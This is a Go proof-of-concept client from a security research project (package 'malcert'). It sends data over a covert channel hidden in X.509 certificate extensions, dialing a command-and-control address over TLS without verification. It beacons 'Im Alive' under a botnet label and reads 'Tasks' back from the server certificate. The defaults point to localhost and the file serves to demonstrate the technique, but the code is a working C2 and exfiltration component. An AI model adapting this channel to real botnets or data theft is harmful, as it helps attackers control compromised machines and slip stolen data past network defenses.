/*
Client code for demonstrating transfering a file over x509 extension covert channel.
Research paper over x509 covert channel: http://vixra.org/abs/1801.0016
Written by: Jason Reaves
ver1 - 2Jan2018

MIT License

Copyright (c) 2018 Jason Reaves

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	//"crypto/x509"
	"fmt"
	"log"
	"malcert/helper"
)

type settings struct {
	c2     string
	port   string
	botnet string
	priv   *rsa.PrivateKey
}

func SendData(settings settings, data string) {
	//We can load cert data from files as well
	//cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	ca, pv := helper.GenCertWithString(settings.botnet, data, settings.priv)
	c2 := settings.c2 + ":" + settings.port
	cert, err := tls.X509KeyPair(ca, pv)
	if err != nil {
		log.Fatalf("server: loadkeys: %s", err)
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", c2, &config)
	if err != nil {
		log.Fatalf("client: dial: %s", err)
	}
	defer conn.Close()
	log.Println("client: connected to: ", conn.RemoteAddr())

	state := conn.ConnectionState()
	for _, v := range state.PeerCertificates {
		//Could actually overwrite the publickey with random data as well I think
		//fmt.Println(x509.MarshalPKIXPublicKey(v.PublicKey))
		fmt.Println("Tasks: ", v.CRLDistributionPoints)
	}
	log.Println("client: handshake: ", state.HandshakeComplete)
	log.Println("client: mutual: ", state.NegotiatedProtocolIsMutual)

	log.Print("client: exiting")
}

func main() {
	priv, _ := rsa.GenerateKey(rand.Reader, 4096)
	c2_settings := settings{"127.0.0.1", "4433", "EICAR", priv}
	SendData(c2_settings, "Im Alive")
}
